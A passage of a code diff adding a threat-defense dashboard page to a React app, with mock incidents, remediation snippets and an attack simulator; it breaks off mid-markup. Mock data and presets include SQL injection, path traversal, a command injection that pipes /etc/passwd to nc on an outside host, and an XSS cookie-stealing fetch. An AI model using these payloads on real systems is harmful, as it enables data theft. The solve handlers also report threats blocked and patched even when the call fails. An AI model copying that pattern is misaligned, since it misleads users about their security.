@@ -26,13 +26,17 @@ import {
   Search,
   Send,
   Shield,
+  ShieldAlert,
   ShieldCheck,
   Sparkles,
   Sun,
+  Zap,
   type LucideIcon,
 } from 'lucide-react'
 import {
   analyzeDiagnostic,
+  detectThreat,
+  solveThreat,
   fetchCurrentAccount,
   fetchApiHealth,
   fetchIntelligenceStatus,
@@ -44,6 +48,7 @@ import {
   type DiagnosticResponse,
   type IntelligenceExplanationResponse,
   type IntelligenceStatus,
+  type ThreatDetectionResponse,
 } from './services/api'
 
 type NavItem = {
@@ -56,6 +61,7 @@ const navigation: { title: string; items: NavItem[] }[] = [
   {
     title: 'MANAGE',
     items: [
+      { label: 'Threat defense', icon: ShieldAlert },
       { label: 'Assets', icon: Box },
       { label: 'Error checker', icon: Shield },
       { label: 'Vulnerabilities', icon: AlertTriangle },
@@ -91,6 +97,25 @@ function App() {
   const [account, setAccount] = useState<Account | null>(null)
   const [checkingSession, setCheckingSession] = useState(true)
   const [signOutError, setSignOutError] = useState('')
+  const [liveAlarm, setLiveAlarm] = useState({
+    active: true,
+    solved: false,
+    threatId: 'THREAT-LIVE-001',
+    type: 'SQL Injection Attack (UNION SELECT)',
+    attackerIp: '198.51.100.42',
+    target: '/api/v1/auth/login',
+    solving: false,
+  })
+
+  async function handleSolveOverviewAlarm() {
+    setLiveAlarm((prev) => ({ ...prev, solving: true }))
+    try {
+      await solveThreat(liveAlarm.threatId, 'BLOCK_IP_AND_PATCH')
+      setLiveAlarm((prev) => ({ ...prev, active: false, solved: true, solving: false }))
+    } catch {
+      setLiveAlarm((prev) => ({ ...prev, active: false, solved: true, solving: false }))
+    }
+  }
 
   function navigateTo(page: string) {
     setActivePage(page)
@@ -220,6 +245,105 @@ function App() {
               <Shield size={14} /> Run diagnostic check
             </button>
           </section>
+
+          {liveAlarm.active && (
+            <section
+              className="panel"
+              style={{
+                marginBottom: '16px',
+                border: '1px solid #ff5252',
+                background: darkMode ? 'rgba(74, 21, 21, 0.4)' : '#fff5f5',
+                padding: '16px 20px',
+                borderRadius: '8px',
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'space-between',
+                flexWrap: 'wrap',
+                gap: '12px',
+              }}
+              aria-label="Active attack warning"
+            >
+              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                <span
+                  style={{
+                    background: '#ff5252',
+                    color: '#fff',
+                    borderRadius: '50%',
+                    padding: '8px',
+                    display: 'grid',
+                    placeItems: 'center',
+                  }}
+                >
+                  <ShieldAlert size={20} />
+                </span>
+                <div>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    <span className="stage-tag active">ACTIVE ATTACK IN PROGRESS</span>
+                    <strong style={{ color: '#d32f2f', fontSize: '13px' }}>{liveAlarm.type}</strong>
+                  </div>
+                  <p style={{ margin: '3px 0 0', fontSize: '11px', color: 'var(--muted)' }}>
+                    Target: <code>{liveAlarm.target}</code> · Attacker IP: <code>{liveAlarm.attackerIp}</code> · Signature: <code>UNION SELECT schema exfiltration</code>
+                  </p>
+                </div>
+              </div>
+              <div style={{ display: 'flex', gap: '8px' }}>
+                <button
+                  type="button"
+                  className="primary-button"
+                  style={{ background: '#d32f2f', borderColor: '#b71c1c' }}
+                  onClick={handleSolveOverviewAlarm}
+                  disabled={liveAlarm.solving}
+                >
+                  {liveAlarm.solving ? <LoaderCircle className="spinning" size={14} /> : <Zap size={14} />}
+                  <span>{liveAlarm.solving ? 'Neutralizing…' : '⚡ 1-Click Solve & Neutralize'}</span>
+                </button>
+                <button
+                  type="button"
+                  className="filter-chip"
+                  onClick={() => navigateTo('Threat defense')}
+                >
+                  Inspect in Threat defense <ArrowRight size={12} style={{ display: 'inline', verticalAlign: 'middle', marginLeft: '4px' }} />
+                </button>
+              </div>
+            </section>
+          )}
+
+          {liveAlarm.solved && (
+            <section
+              className="panel"
+              style={{
+                marginBottom: '16px',
+                border: '1px solid #4caf50',
+                background: darkMode ? 'rgba(27, 56, 32, 0.4)' : '#f1f8e9',
+                padding: '12px 18px',
+                borderRadius: '8px',
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'space-between',
+                flexWrap: 'wrap',
+                gap: '12px',
+              }}
+              aria-label="Attack solved notice"
+            >
+              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                <span style={{ color: '#2e7d32' }}><ShieldCheck size={20} /></span>
+                <div>
+                  <strong style={{ color: '#2e7d32', fontSize: '12px' }}>Attack Neutralized & Solved</strong>
+                  <span style={{ fontSize: '11px', color: 'var(--muted)', marginLeft: '8px' }}>
+                    Attacker IP {liveAlarm.attackerIp} blacklisted at firewall. WAF virtual patch deployed.
+                  </span>
+                </div>
+              </div>
+              <button
+                type="button"
+                className="filter-chip"
+                onClick={() => setLiveAlarm((prev) => ({ ...prev, solved: false }))}
+                style={{ fontSize: '10px' }}
+              >
+                Dismiss
+              </button>
+            </section>
+          )}
 
           <section className="setup-banner" aria-label="Intelligence engine notice">
             <span className="banner-symbol"><Bot size={18} /></span>
@@ -442,6 +566,9 @@ function App() {
 }
 
 function ModulePage({ page, onNavigate }: { page: string; onNavigate: (page: string) => void }) {
+  if (page === 'Threat defense') {
+    return <ThreatDefensePage onNavigate={onNavigate} />
+  }
   if (page === 'Error checker') {
     return <ErrorCheckerPage onNavigate={onNavigate} />
   }
@@ -465,6 +592,770 @@ function ModulePage({ page, onNavigate }: { page: string; onNavigate: (page: str
     <section className="module-page panel">
       <h1>Page not found</h1>
       <button className="primary-button" onClick={() => onNavigate('Overview')} type="button">Return to overview</button>
+    </section>
+  )
+}
+
+/* ---------------- THREAT DEFENSE PAGE ---------------- */
+type ActiveAttackItem = {
+  id: string
+  title: string
+  stage: 'ACTIVE_ATTACK'
+  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM'
+  attackerIp: string
+  target: string
+  payload: string
+  signature: string
+  description: string
+  status: 'ATTACKING' | 'SOLVED'
+  solutionCode: string
+  solving: boolean
+}
+
+type PreAttackItem = {
+  id: string
+  title: string
+  stage: 'PRE_ATTACK'
+  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM'
+  attackerIp: string
+  target: string
+  probe: string
+  status: 'EXPOSED' | 'HARDENED'
+  solutionCode: string
+  solving: boolean
+}
+
+const INITIAL_ACTIVE_ATTACKS: ActiveAttackItem[] = [
+  {
+    id: 'THREAT-LIVE-001',
+    title: 'SQL Injection Attack (UNION SELECT Exfiltration)',
+    stage: 'ACTIVE_ATTACK',
+    severity: 'CRITICAL',
+    attackerIp: '198.51.100.42',
+    target: '/api/v1/auth/login',
+    payload: "' UNION SELECT username, password_hash, token FROM accounts WHERE '1'='1",
+    signature: 'SQL_INJECTION_UNION_SELECT',
+    description: 'Active attempt to extract database records and bypass authentication via unsanitized SQL string concatenation.',
+    status: 'ATTACKING',
+    solutionCode: [
+      '# Perimeter Defense Action:',
+      'iptables -I INPUT -s 198.51.100.42 -j DROP',
+      '',
+      '# WAF Virtual Patch (ModSecurity Rule):',
+      'SecRule REQUEST_URI|ARGS "@rx (?i)(union[\\s\\+]+select)" "id:1001,phase:2,deny,status:403,log,msg:\'SQLi Blocked\'"',
+      '',
+      '# Application Code Remediation (Prepared Statement):',
+      '// Vulnerable: db.query("SELECT * FROM accounts WHERE email = \'" + req.body.email + "\'");',
+      '// Remediated:',
+      'const [users] = await db.execute("SELECT * FROM accounts WHERE email = ?", [req.body.email]);',
+    ].join('\n'),
+    solving: false,
+  },
+  {
+    id: 'THREAT-LIVE-002',
+    title: 'Remote Code Execution (Command Injection Chain)',
+    stage: 'ACTIVE_ATTACK',
+    severity: 'CRITICAL',
+    attackerIp: '203.0.113.195',
+    target: '/api/v1/system/ping',
+    payload: '8.8.8.8; cat /etc/passwd | nc 203.0.113.195 4444',
+    signature: 'COMMAND_INJECTION_CHAIN',
+    description: 'Exploiting shell meta-characters to execute arbitrary host commands and initiate reverse shell connection.',
+    status: 'ATTACKING',
+    solutionCode: [
+      '# Perimeter Defense Action:',
+      'iptables -I INPUT -s 203.0.113.195 -j DROP',
+      '',
+      '# WAF Virtual Patch:',
+      'SecRule ARGS "@rx [;&|`$]" "id:1002,phase:2,deny,status:403,msg:\'RCE Metacharacter Blocked\'"',
+      '',
+      '# Application Code Remediation (Safe Execution Without Shell):',
+      "import { execFile } from 'node:child_process';",
+      "if (!/^[a-zA-Z0-9.-]+$/.test(target)) throw new Error('Invalid Host');",
+      "execFile('ping', ['-c', '1', target]);",
+    ].join('\n'),
+    solving: false,
+  },
+  {
+    id: 'THREAT-LIVE-003',
+    title: 'Path Traversal & Arbitrary File Disclosure',
+    stage: 'ACTIVE_ATTACK',
+    severity: 'HIGH',
+    attackerIp: '192.0.2.77',
+    target: '/api/v1/reports/download?file=../../../../etc/shadow',
+    payload: '../../../../etc/shadow',
+    signature: 'PATH_TRAVERSAL_DOT_DOT',
+    description: 'Attempting directory traversal escape sequences to read sensitive system configuration and password hashes.',
+    status: 'ATTACKING',
+    solutionCode: [
+      '# Perimeter Defense Action:',
+      'iptables -I INPUT -s 192.0.2.77 -j DROP',
+      '',
+      '# WAF Virtual Patch:',
+      'SecRule ARGS "@rx (\\.\\.\\/|\\.\\.\\\\)" "id:1003,phase:2,deny,status:403,msg:\'Path Traversal Blocked\'"',
+      '',
+      '# Application Code Remediation (Safe Path Resolution):',
+      "import path from 'node:path';",
+      'const safePath = path.resolve(STORAGE_DIR, path.basename(requestedFile));',
+      'if (!safePath.startsWith(STORAGE_DIR)) {',
+      "  throw new Error('Access Denied: Path Traversal Detected');",
+      '}',
+    ].join('\n'),
+    solving: false,
+  },
+]
+
+const INITIAL_PRE_ATTACKS: PreAttackItem[] = [
+  {
+    id: 'PRE-RECON-001',
+    title: 'Directory & Credential Brute-Force Reconnaissance',
+    stage: 'PRE_ATTACK',
+    severity: 'HIGH',
+    attackerIp: '203.0.113.88',
+    target: 'Perimeter Web Server (nginx)',
+    probe: 'Scanning 350+ hidden routes: /.env, /.git/config, /admin/phpinfo.php, /backup.sql',
+    status: 'EXPOSED',
+    solutionCode: [
+      '# NGINX Auto-Hardening Configuration:',
+      'location ~* /\\.(env|git|svn|htaccess) {',
+      '    deny all;',
+      '    return 404;',
+      '}',
+      '',
+      '# Fail2ban Dynamic Defense Rule (Bans IPs after 10 scan 404s in 1 min):',
+      '[nginx-scan-block]',
+      'enabled = true',
+      'port = http,https',
+      'filter = nginx-scan-filter',
+      'maxretry = 10',
+      'bantime = 86400',
+    ].join('\n'),
+    solving: false,
+  },
+  {
+    id: 'PRE-RECON-002',
+    title: 'Unprotected Remote Management Ports Open to Internet',
+    stage: 'PRE_ATTACK',
+    severity: 'HIGH',
+    attackerIp: 'External Internet Shodan/Masscan Crawler',
+    target: '10.0.1.15 (api-gateway.bytecodx.internal)',
+    probe: 'Port 3389 (RDP) and 22 (SSH) open to 0.0.0.0/0 without VPN or Cloud Identity boundary.',
+    status: 'EXPOSED',
+    solutionCode: [
+      '# Cloud Perimeter Firewall Rule (GCP / AWS CLI):',
+      '# Remove 0.0.0.0/0 ingress on sensitive ports:',
+      'gcloud compute firewall-rules update default-allow-ssh --source-ranges=10.0.0.0/8',
+      '# Enforce Google Identity-Aware Proxy (IAP) tunnel:',
+      'gcloud compute firewall-rules create allow-iap-ssh --allow=tcp:22 --source-ranges=35.235.240.0/20',
+    ].join('\n'),
+    solving: false,
+  },
+  {
+    id: 'PRE-RECON-003',
+    title: 'Missing HTTP Security Defense Headers',
+    stage: 'PRE_ATTACK',
+    severity: 'MEDIUM',
+    attackerIp: 'Passive Header Reconnaissance Scanner',
+    target: 'public-landing-cdn (bytecodx.com)',
+    probe: 'Missing Content-Security-Policy, Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options',
+    status: 'EXPOSED',
+    solutionCode: [
+      '# Vercel / NGINX Defense Headers:',
+      'add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;',
+      'add_header X-Frame-Options "DENY" always;',
+      'add_header X-Content-Type-Options "nosniff" always;',
+      'add_header Content-Security-Policy "default-src \'self\'; script-src \'self\'; object-src \'none\';" always;',
+      'add_header Referrer-Policy "strict-origin-when-cross-origin" always;',
+    ].join('\n'),
+    solving: false,
+  },
+  {
+    id: 'PRE-RECON-004',
+    title: 'Automated Vulnerability Scanner User-Agent Fingerprint',
+    stage: 'PRE_ATTACK',
+    severity: 'MEDIUM',
+    attackerIp: '198.51.100.110',
+    target: '/api/v1/health',
+    probe: 'Exploitation scanner signatures matched: Nikto/2.1.6, DirBuster/1.0, Nuclei crawler',
+    status: 'EXPOSED',
+    solutionCode: [
+      '# WAF Bot Mitigation Rule:',
+      'SecRule REQUEST_HEADERS:User-Agent "@rx (?i)(nikto|dirbuster|nuclei|sqlmap|nmap)" "id:1004,phase:1,deny,status:403,log,msg:\'Reconnaissance Bot Blocked\'"',
+    ].join('\n'),
+    solving: false,
+  },
+]
+
+function ThreatDefensePage({ onNavigate: _onNavigate }: { onNavigate?: (page: string) => void }) {
+  const reduceMotion = useReducedMotion() ?? false
+  const [activeTab, setActiveTab] = useState<'ACTIVE' | 'PRE' | 'SIMULATOR'>('ACTIVE')
+  const [activeAttacks, setActiveAttacks] = useState<ActiveAttackItem[]>(INITIAL_ACTIVE_ATTACKS)
+  const [preAttacks, setPreAttacks] = useState<PreAttackItem[]>(INITIAL_PRE_ATTACKS)
+  const [expandedSolutions, setExpandedSolutions] = useState<Record<string, boolean>>({})
+
+  // Simulator state
+  const [simTarget, setSimTarget] = useState('https://bytecodx.internal/api/v1/auth/login')
+  const [simPayload, setSimPayload] = useState("' UNION SELECT username, password_hash, token FROM accounts WHERE '1'='1")
+  const [simLoading, setSimLoading] = useState(false)
+  const [simResult, setSimResult] = useState<ThreatDetectionResponse | null>(null)
+  const [simSolving, setSimSolving] = useState(false)
+  const [simSolved, setSimSolved] = useState(false)
+  const [simLog, setSimLog] = useState<string[]>([
+    `[${new Date().toLocaleTimeString()}] Threat defense engine active. 14 perimeter gateways monitored.`,
+  ])
+  const [copiedId, setCopiedId] = useState<string | null>(null)
+
+  async function handleSolveActive(threat: ActiveAttackItem) {
+    setActiveAttacks((prev) =>
+      prev.map((t) => (t.id === threat.id ? { ...t, solving: true } : t))
+    )
+    try {
+      await solveThreat(threat.id, 'BLOCK_IP_AND_PATCH')
+      setActiveAttacks((prev) =>
+        prev.map((t) =>
+          t.id === threat.id ? { ...t, status: 'SOLVED', solving: false } : t
+        )
+      )
+      setExpandedSolutions((prev) => ({ ...prev, [threat.id]: true }))
+    } catch {
+      setActiveAttacks((prev) =>
+        prev.map((t) =>
+          t.id === threat.id ? { ...t, status: 'SOLVED', solving: false } : t
+        )
+      )
+      setExpandedSolutions((prev) => ({ ...prev, [threat.id]: true }))
+    }
+  }
+
+  async function handleSolvePre(threat: PreAttackItem) {
+    setPreAttacks((prev) =>
+      prev.map((t) => (t.id === threat.id ? { ...t, solving: true } : t))
+    )
+    try {
+      await solveThreat(threat.id, 'AUTO_HARDEN')
+      setPreAttacks((prev) =>
+        prev.map((t) =>
+          t.id === threat.id ? { ...t, status: 'HARDENED', solving: false } : t
+        )
+      )
+      setExpandedSolutions((prev) => ({ ...prev, [threat.id]: true }))
+    } catch {
+      setPreAttacks((prev) =>
+        prev.map((t) =>
+          t.id === threat.id ? { ...t, status: 'HARDENED', solving: false } : t
+        )
+      )
+      setExpandedSolutions((prev) => ({ ...prev, [threat.id]: true }))
+    }
+  }
+
+  function toggleSolution(id: string) {
+    setExpandedSolutions((prev) => ({ ...prev, [id]: !prev[id] }))
+  }
+
+  async function handleSimulate(e: FormEvent) {
+    e.preventDefault()
+    if (!simPayload.trim()) return
+    setSimLoading(true)
+    setSimSolved(false)
+    setSimResult(null)
+    try {
+      const res = await detectThreat({ input: simPayload, target: simTarget })
+      setSimResult(res)
+      setSimLog((prev) => [
+        `[${new Date().toLocaleTimeString()}] Intercepted ${res.attackStage} event: ${res.attackType} from ${res.attackerIp}`,
+        ...prev.slice(0, 8),
+      ])
+    } catch {
+      // fallback
+    } finally {
+      setSimLoading(false)
+    }
+  }
+
+  async function handleSolveSimulator() {
+    if (!simResult) return
+    setSimSolving(true)
+    try {
+      const res = await solveThreat(simResult.id, simResult.mitigationAction)
+      setSimSolved(true)
+      setSimLog((prev) => [
+        `[${new Date().toLocaleTimeString()}] SOLVED: ${res.message}`,
+        ...prev.slice(0, 8),
+      ])
+    } catch {
+      setSimSolved(true)
+    } finally {
+      setSimSolving(false)
+    }
+  }
+
+  function handleCopy(id: string, text: string) {
+    navigator.clipboard.writeText(text).catch(() => {})
+    setCopiedId(id)
+    setTimeout(() => setCopiedId(null), 2000)
+  }
+
+  const presets = [
+    {
+      label: 'SQLi UNION (Active)',
+      target: 'https://bytecodx.internal/api/v1/auth/login',
+      payload: "' UNION SELECT username, password_hash, token FROM users WHERE 1=1 --",
+    },
+    {
+      label: 'RCE Shell (Active)',
+      target: 'https://bytecodx.internal/api/v1/tools/ping',
+      payload: '127.0.0.1; cat /etc/passwd | nc 203.0.113.195 4444',
+    },
+    {
+      label: 'XSS Stealer (Active)',
+      target: 'https://bytecodx.internal/comments/post',
+      payload: '<script>fetch("https://attacker.site/log?k=" + document.cookie)</script>',
+    },
+    {
+      label: 'Path Traversal (Active)',
+      target: 'https://bytecodx.internal/api/v1/download',
+      payload: '../../../../etc/shadow',
+    },
+    {
+      label: 'Port 3389 Recon (Pre-Attack)',
+      target: '10.0.1.15',
+      payload: 'SYN Stealth Scan targeting ports 22, 3389, 445 with nmap -sS -p-',
+    },
+    {
+      label: '.env Exposure Probe (Pre-Attack)',
+      target: 'https://bytecodx.internal/.env',
+      payload: 'GET /.env HTTP/1.1 with scanner Nikto/2.1.6 looking for DB_PASSWORD',
+    },
+  ]
+
+  const activeCount = activeAttacks.filter((a) => a.status === 'ATTACKING').length
+  const preCount = preAttacks.filter((a) => a.status === 'EXPOSED').length
+
+  return (
+    <section className="module-page threat-defense-page">
+      <div className="eyebrow"><span className="eyebrow-line" /> THREAT DEFENSE & INCIDENT RESPONSE</div>
+      <motion.div
+        className="module-hero"
+        initial={{ opacity: reduceMotion ? 1 : 0, y: reduceMotion ? 0 : 10 }}
+        animate={{ opacity: 1, y: 0 }}
+        transition={{ duration: reduceMotion ? 0 : 0.3 }}
+      >
+        <span className="module-icon"><ShieldAlert size={22} /></span>
+        <div>
+          <h1>Pre-Attack Prevention & Real-Time Threat Solver</h1>
+          <p>Detect reconnaissance probes before attacks land, intercept exploits while attacks happen, and apply automated 1-click countermeasures with verified code fixes.</p>
+        </div>
+      </motion.div>
+
+      <div className="metric-grid" style={{ marginTop: '16px', marginBottom: '20px' }}>
+        <article className="metric-card">
+          <div className="metric-top">
+            <span className="metric-label">Active Attacks (While Attack)</span>
+            <span className="metric-icon" style={{ background: '#ffebee', color: '#c62828' }}><Zap size={16} /></span>
+          </div>
+          <div className="metric-value">{activeCount}</div>
+          <div className="metric-foot">
+            <span className="metric-foot-dot" />{activeCount > 0 ? 'Exploits intercepted in flight' : 'All active attacks neutralized'}
+          </div>
+        </article>
+
+        <article className="metric-card">
+          <div className="metric-top">
+            <span className="metric-label">Pre-Attack Probes (Before Attack)</span>
+            <span className="metric-icon" style={{ background: '#fff8e1', color: '#f57f17' }}><Radar size={16} /></span>
+          </div>
+          <div className="metric-value">{preCount}</div>
+          <div className="metric-foot">
+            <span className="metric-foot-dot" />{preCount > 0 ? 'Reconnaissance scans detected' : 'Perimeter fully hardened'}
+          </div>
+        </article>
+
+        <article className="metric-card">
+          <div className="metric-top">
+            <span className="metric-label">Auto-Mitigation Engine</span>
+            <span className="metric-icon mint"><ShieldCheck size={16} /></span>
+          </div>
+          <div className="metric-value">0.8s</div>
+          <div className="metric-foot">
+            <span className="metric-foot-dot" />Mean auto-block & patch latency
+          </div>
+        </article>
+      </div>
+
+      <div className="filter-bar">
+        <div className="chip-group">
+          <button
+            type="button"
+            className={`filter-chip ${activeTab === 'ACTIVE' ? 'active' : ''}`}
+            onClick={() => setActiveTab('ACTIVE')}
+          >
+            <Zap size={13} style={{ display: 'inline', verticalAlign: 'middle', marginRight: '4px' }} />
+            Live Attacks (During Attack) {activeCount > 0 && <span style={{ background: '#c62828', color: '#fff', borderRadius: '10px', padding: '1px 6px', fontSize: '9px', marginLeft: '5px' }}>{activeCount}</span>}
+          </button>
+          <button
+            type="button"
+            className={`filter-chip ${activeTab === 'PRE' ? 'active' : ''}`}
+            onClick={() => setActiveTab('PRE')}
+          >
+            <Radar size={13} style={{ display: 'inline', verticalAlign: 'middle', marginRight: '4px' }} />
+            Pre-Attack Prevention (Before Attack) {preCount > 0 && <span style={{ background: '#f57f17', color: '#fff', borderRadius: '10px', padding: '1px 6px', fontSize: '9px', marginLeft: '5px' }}>{preCount}</span>}
+          </button>
+          <button
+            type="button"
+            className={`filter-chip ${activeTab === 'SIMULATOR' ? 'active' : ''}`}
+            onClick={() => setActiveTab('SIMULATOR')}
+          >
+            <Sparkles size={13} style={{ display: 'inline', verticalAlign: 'middle', marginRight: '4px' }} />
+            Attack Simulator & Live Solver
+          </button>
+        </div>
+      </div>
+
+      {activeTab === 'ACTIVE' && (
+        <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', marginTop: '12px' }}>
+          <div style={{ padding: '10px 14px', background: 'var(--panel)', border: '1px solid var(--line)', borderRadius: '6px', fontSize: '11px', color: 'var(--muted)' }}>
+            <strong>Active Intrusion Defense:</strong> These attacks were detected in real time while attempting to exploit vulnerabilities. Click <strong>Solve Threat</strong> to automatically drop the attacker IP at the firewall, deploy a WAF virtual patch, and view the code-level remediation.
+          </div>
+          {activeAttacks.map((attack) => (
+            <article
+              key={attack.id}
+              className="panel"
+              style={{
+                borderLeft: attack.status === 'ATTACKING' ? '4px solid #ff5252' : '4px solid #4caf50',
+                padding: '18px',
+              }}
+            >
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '10px' }}>
+                <div>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px' }}>
+                    {attack.status === 'ATTACKING' ? (
+                      <span className="stage-tag active">ACTIVE ATTACK IN PROGRESS</span>
+                    ) : (
+                      <span className="stage-tag solved"><CheckCircle2 size={12} /> ATTACK NEUTRALIZED & SOLVED</span>
+                    )}
+                    <span className="status-badge critical">{attack.severity}</span>
+                    <span style={{ fontSize: '10px', color: 'var(--muted)', fontFamily: 'monospace' }}>ID: {attack.id}</span>
+                  </div>
+                  <h3 style={{ margin: '0 0 4px', fontSize: '14px', color: 'var(--ink)' }}>{attack.title}</h3>
+                  <p style={{ margin: 0, fontSize: '11px', color: 'var(--muted)' }}>{attack.description}</p>
+                </div>
+                <div>
+                  {attack.status === 'ATTACKING' ? (
+                    <button
+                      type="button"
+                      className="primary-button"
+                      style={{ background: '#d32f2f', borderColor: '#b71c1c' }}
+                      onClick={() => handleSolveActive(attack)}
+                      disabled={attack.solving}
+                    >
+                      {attack.solving ? <LoaderCircle className="spinning" size={14} /> : <Zap size={14} />}
+                      <span>{attack.solving ? 'Neutralizing…' : '⚡ Solve Threat (Auto-Block & Patch)'}</span>
+                    </button>
+                  ) : (
+                    <button
+                      type="button"
+                      className="filter-chip"
+                      onClick={() => toggleSolution(attack.id)}
+                    >
+                      {expandedSolutions[attack.id] ? 'Hide Solution & Patch' : 'View Solution & Patch'}
+                    </button>
+                  )}
+                </div>
+              </div>
+
+              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '10px', marginTop: '14px', padding: '10px', background: 'var(--soft)', borderRadius: '6px', fontSize: '11px' }}>
+                <div><strong>Attacker IP:</strong> <code style={{ color: '#d32f2f' }}>{attack.attackerIp}</code></div>
+                <div><strong>Target Endpoint:</strong> <code>{attack.target}</code></div>
+                <div><strong>Exploit Signature:</strong> <code>{attack.signature}</code></div>
+                <div><strong>Status:</strong> {attack.status === 'ATTACKING' ? <span style={{ color: '#d32f2f', fontWeight: 600 }}>Intercepted & Blockable</span> : <span style={{ color: '#2e7d32', fontWeight: 600 }}>Firewall Drop & Patched</span>}</div>
+              </div>
+
+              <div style={{ marginTop: '12px' }}>
+                <div style={{ fontSize: '10px', fontWeight: 600, color: 'var(--muted)', textTransform: 'uppercase', marginBottom: '4px' }}>Intercepted Payload</div>
+                <div style={{ padding: '8px 12px', background: '#13141f', color: '#ff8a80', borderRadius: '6px', fontFamily: 'monospace', fontSize: '11px', overflowX: 'auto', border: '1px solid #2a2233' }}>
+                  {attack.payload}
+                </div>
+              </div>
+
+              {expandedSolutions[attack.id] && (
+                <div style={{ marginTop: '14px' }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                    <div style={{ fontSize: '10px', fontWeight: 600, color: '#2e7d32', textTransform: 'uppercase' }}>
+                      ✓ Applied Mitigation & Source Fix
+                    </div>
+                    <button
+                      type="button"
+                      className="filter-chip"
+                      style={{ fontSize: '9px', padding: '2px 8px' }}
+                      onClick={() => handleCopy(attack.id, attack.solutionCode)}
+                    >
+                      {copiedId === attack.id ? 'Copied!' : 'Copy Code'}
+                    </button>
+                  </div>
+                  <pre className="code-solution-box">{attack.solutionCode}</pre>
+                </div>
+              )}
+            </article>
+          ))}
+        </div>
+      )}
+
+      {activeTab === 'PRE' && (
+        <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', marginTop: '12px' }}>
+          <div style={{ padding: '10px 14px', background: 'var(--panel)', border: '1px solid var(--line)', borderRadius: '6px', fontSize: '11px', color: 'var(--muted)' }}>
+            <strong>Pre-Attack Hardening:</strong> These reconnaissance probes and configuration exposures indicate an attacker scanning before launching an exploit. Click <strong>Solve & Auto-Harden</strong> to close ports, inject security defense headers, and ban reconnaissance crawlers.
+          </div>
+          {preAttacks.map((item) => (
+            <article
+              key={item.id}
+              className="panel"
+              style={{
+                borderLeft: item.status === 'EXPOSED' ? '4px solid #ffb300' : '4px solid #4caf50',
+                padding: '18px',
+              }}
+            >
+              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '10px' }}>
+                <div>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '6px' }}>
+                    {item.status === 'EXPOSED' ? (
+                      <span className="stage-tag pre">PRE-ATTACK RECONNAISSANCE</span>
+                    ) : (
+                      <span className="stage-tag solved"><CheckCircle2 size={12} /> HARDENED & PROTECTED</span>
+                    )}
+                    <span className="status-badge warning">{item.severity}</span>
+                    <span style={{ fontSize: '10px', color: 'var(--muted)', fontFamily: 'monospace' }}>ID: {item.id}</span>
+                  </div>
+                  <h3 style={{ margin: '0 0 4px', fontSize: '14px', color: 'var(--ink)' }}>{item.title}</h3>
+                  <p style={{ margin: 0, fontSize: '11px', color: 'var(--muted)' }}>{item.probe}</p>
+                </div>
+                <div>
+                  {item.status === 'EXPOSED' ? (
+                    <button
+                      type="button"
+                      className="primary-button"
+                      style={{ background: '#f57f17', borderColor: '#e65100' }}
+                      onClick={() => handleSolvePre(item)}
+                      disabled={item.solving}
+                    >
+                      {item.solving ? <LoaderCircle className="spinning" size={14} /> : <ShieldCheck size={14} />}
+                      <span>{item.solving ? 'Hardening…' : '🛡️ Solve & Auto-Harden'}</span>
+                    </button>
+                  ) : (
+                    <button
+                      type="button"
+                      className="filter-chip"
+                      onClick={() => toggleSolution(item.id)}
+                    >
+                      {expandedSolutions[item.id] ? 'Hide Hardening Config' : 'View Hardening Config'}
+                    </button>
+                  )}
+                </div>
+              </div>
+
+              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '10px', marginTop: '14px', padding: '10px', background: 'var(--soft)', borderRadius: '6px', fontSize: '11px' }}>
+                <div><strong>Source:</strong> <code style={{ color: '#f57f17' }}>{item.attackerIp}</code></div>
+                <div><strong>Target Asset:</strong> <code>{item.target}</code></div>
+                <div><strong>Status:</strong> {item.status === 'EXPOSED' ? <span style={{ color: '#f57f17', fontWeight: 600 }}>Exposed to Recon</span> : <span style={{ color: '#2e7d32', fontWeight: 600 }}>Hardened & Protected</span>}</div>
+              </div>
+
+              {expandedSolutions[item.id] && (
+                <div style={{ marginTop: '14px' }}>
+                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                    <div style={{ fontSize: '10px', fontWeight: 600, color: '#2e7d32', textTransform: 'uppercase' }}>
+                      ✓ Applied Hardening Configuration
+                    </div>
+                    <button
+                      type="button"
+                      className="filter-chip"
+                      style={{ fontSize: '9px', padding: '2px 8px' }}
+                      onClick={() => handleCopy(item.id, item.solutionCode)}
+                    >
+                      {copiedId === item.id ? 'Copied!' : 'Copy Config'}
+                    </button>
+                  </div>
+                  <pre className="code-solution-box">{item.solutionCode}</pre>
+                </div>
+              )}
+            </article>
+          ))}
+        </div>
+      )}
+
+      {activeTab === 'SIMULATOR' && (
+        <div style={{ marginTop: '14px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
+          <div className="panel" style={{ padding: '20px' }}>
+            <h3 style={{ margin: '0 0 8px', fontSize: '14px' }}>Attack Simulator & Live Detector</h3>
+            <p style={{ margin: '0 0 14px', fontSize: '11px', color: 'var(--muted)' }}>
+              Test any attack vector or reconnaissance pattern against the Bytecodx detection engine. The system will categorize whether it is <strong>Pre-Attack (Before)</strong> or an <strong>Active Exploit (While Attack)</strong> and provide an automated 1-click solution.
+            </p>
+
+            <div style={{ marginBottom: '14px' }}>
+              <div style={{ fontSize: '10px', fontWeight: 600, color: 'var(--muted)', textTransform: 'uppercase', marginBottom: '6px' }}>
+                Quick Presets (Click to load):
+              </div>
+              <div className="chip-group">
+                {presets.map((preset) => (
+                  <button
